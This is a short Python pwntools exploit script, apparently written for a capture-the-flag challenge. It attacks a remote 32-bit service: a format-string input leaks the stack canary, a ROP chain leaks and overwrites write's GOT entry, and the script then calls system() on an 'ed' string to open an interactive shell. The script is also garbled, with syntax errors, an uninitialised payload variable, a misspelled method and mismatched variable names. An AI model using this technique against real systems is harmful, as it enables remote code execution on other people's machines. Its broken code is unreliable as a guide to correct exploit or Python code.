#!/usr/bin/python

from pwn import *

#Libc Offsets
offset___libc_start_main_ret = Ox1aed5
offset_system = 0x00041360
offset_dup2 = 0x000f11c0
offset_read = 0x000f0540
offset_write = 0x000f05e0
offset_str_bin_sh = 0x18b363

#Write and Read
write_plt = 0x08049140
write_got = 0x804c028
read_plt = 0x080490d0

#ROPGadget
pop_pop_pop_ret = 0x080493f1

ed_string = 0x804831f

# For privacy conerns, the IP and PORT are not listed.
def main()):
    p = remote ("IP", PORT)

    p. sendline (b'%29$x")
    leak_canary = int(p.recv(10), 16)
    
    payload += b"A" * 100
    payload += p32(leak_canary) 
    payload += b"A" * 12

    payload += p32(write_plt)
    payload += p32(pop_pop_pop_ret)
    payload += p32(1)
    payload += p32(write_got)
    payload += p32(4)
    payload += p32(read_plt)
    payload += p32(pop_pop_pop_ret)
    payload += p32(0)
    payload += p32(write_got)
    payload += p32(4)

    payload += p32(write_plt)
    payload += p32(0xdeadbeef)
    payload += p32(ed_string)

    p.sendline(payload)

    p.rev(100)
    leak_data = p.recv(4)
    snprintf_libc = u32(leak_data)

    libc_start_addr = snprintf_libc - offset_write
    system_libc = libc_start_addr + offset_system

    p.send(p32(system_libc))

    p.interactive()

if __name__ == "__main__":
    main()